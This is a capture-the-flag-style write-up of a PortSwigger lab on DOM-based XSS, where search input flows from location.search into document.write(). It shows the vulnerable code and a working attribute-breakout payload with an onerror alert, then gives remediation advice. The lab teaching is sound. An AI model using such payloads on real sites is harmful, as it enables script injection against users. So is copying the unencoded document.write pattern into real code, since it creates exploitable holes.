# DOM XSS in `document.write()` using `location.search`

## Overview

This PortSwigger Web Security Academy lab demonstrates a **DOM-based Cross-Site Scripting (XSS)** vulnerability caused by inserting user-controlled URL data into `document.write()` without proper output encoding.

**Difficulty:** Apprentice
**Category:** DOM-based XSS

## Vulnerable Code

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
```

The application uses the search query as the value of `query` and writes it directly into an HTML `<img>` element.

## Source → Sink

The vulnerable data flow is:

```text
location.search → query → document.write()
```

`location.search` is attacker-controlled because the search query is contained in the URL.

The application then places this value directly into HTML.

### Expected behavior

For a search such as:

```text
hello
```

the application generates:

```html
<img src="/resources/images/tracker.gif?searchTerms=hello">
```

The search input is therefore placed inside the `src` attribute.

## Identifying the Injection Context

The important question was:

> Where exactly is my input being inserted?

The input was placed inside:

```html
<img src="USER_INPUT">
```

Because the input was not properly encoded, an attacker could use a quote to terminate the existing `src` attribute and inject additional HTML.

## Exploitation

Payload used:

```html
"><img src=x onerror=alert(1)>
```

The resulting HTML is conceptually similar to:

```html
<img src="/resources/images/tracker.gif?searchTerms=">
<img src=x onerror=alert(1)>
```

The injected `<img>` element uses:

```html
src=x
```

which causes the browser to attempt to load an invalid image.

When the image fails to load, the `error` event is triggered:

```html
onerror=alert(1)
```

This executes JavaScript and displays the alert, completing the lab.

## Exploit Flow

```text
Attacker-controlled search parameter
            ↓
       location.search
            ↓
           query
            ↓
      document.write()
            ↓
       HTML injection
            ↓
  <img src=x onerror=alert(1)>
            ↓
       Image load fails
            ↓
        error event
            ↓
         alert(1)
```

## Key Takeaways

* `location.search` can contain attacker-controlled input.
* `document.write()` can create dangerous DOM XSS when used with unsanitized input.
* Always identify the **injection context** before choosing an XSS payload.
* Here, the input was inside an HTML attribute, so the first step was escaping the attribute with `"`.
* The injected `onerror` handler provided a JavaScript execution path.

## Remediation

Avoid inserting untrusted input directly into HTML with `document.write()`.

Prefer safe DOM APIs and properly encode untrusted data according to its output context.

For example, text that should be displayed as text should be inserted using APIs such as:

```javascript
element.textContent = userInput;
```

rather than constructing HTML with untrusted input.
